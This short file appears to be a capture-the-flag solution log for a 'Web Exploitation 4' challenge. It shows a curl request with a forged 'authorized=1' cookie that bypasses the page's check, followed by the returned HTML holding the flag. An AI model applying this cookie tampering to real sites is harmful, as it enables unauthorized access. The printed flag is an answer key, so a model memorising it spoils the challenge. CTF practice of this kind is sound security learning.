@@ -1,0 +1,13 @@
+>> curl -b "authorized=1" http://web.camsctf.com/4/  
+<!DOCTYPE HTML>
+<html>
+        <head>
+                <link rel="stylesheet" href="style.css" type="text/css" />
+                <link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono' rel='stylesheet' type='text/css'>
+                <title>Web Exploitation 4</title>
+        </head>
+
+        <body>
+                <p>Flag: {C0O0KIEEEEEE!}</p>
+        </body>
+</html>%                                   
